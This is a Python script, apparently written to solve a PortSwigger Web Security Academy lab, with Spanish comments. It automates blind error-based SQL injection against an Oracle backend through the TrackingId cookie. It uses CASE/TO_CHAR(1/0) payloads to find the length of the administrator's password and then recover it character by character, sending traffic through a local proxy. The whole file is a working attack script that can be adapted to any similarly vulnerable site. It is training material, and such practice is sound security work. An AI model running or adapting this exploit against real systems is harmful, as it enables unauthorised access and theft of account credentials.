import requests
import sys
import signal
from pwn import *
import time
import urllib3
import string

# Deshabilitar advertencias de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

main_url = "https://0ad8001604c76e8b83cdf01400a8002c.web-security-academy.net"
cookie = "JmdQAVn2iTb6iSSG"
characters = string.digits + string.ascii_lowercase

proxy = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080'
}

def def_handler(sig, frame):
  print("\n[!] Saliendo...\n")
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def exploit_sqli(sql_query):
  headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
  }

  cookies = {
    'TrackingId': f"{cookie}{sql_query}"
  }

  response = requests.get(main_url, cookies=cookies, headers=headers, verify=False, proxies=proxy)

  if response.status_code == 500:
    # print('[+] Sqli exploited succesfully!\n')
    return True

  return False

def main():
  # sql_query = "'||(SELECT CASE WHEN ((select username from users where username='administrator')='administrator') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -"
  # exploit_sqli(sql_query)

  status_logger = log.progress("Fuerza bruta")
  status_logger.status("Iniciando proceso de fuerza bruta...")

  time.sleep(1)

  length_logger = log.progress("Password length")

  # Get password length
  password_length = 0
  for i in range(0, 50):
    sql_length_query = f"'||(SELECT CASE WHEN ((select length(password) from users where username='administrator')={i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -"
    status_logger.status(sql_length_query)

    response = exploit_sqli(sql_length_query)

    if response == True:
      password_length = i
      length_logger.success(f"{password_length}")
      break

    length_logger.status(i)


  # Dump administrator password
  password_logger = log.progress("Password")
  password = ""

  for position in range(password_length + 1):
    if position == 0:
      continue

    for character in characters:
      sql_password_query = f"'||(SELECT CASE WHEN ((select substr(password,{position},1) from users where username='administrator')='{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -"
      status_logger.status(sql_password_query)

      response = exploit_sqli(sql_password_query)

      if response == True:
        password += character
        password_logger.status(password)
        break

  password_logger.success(password)

if __name__ == "__main__":
  main()
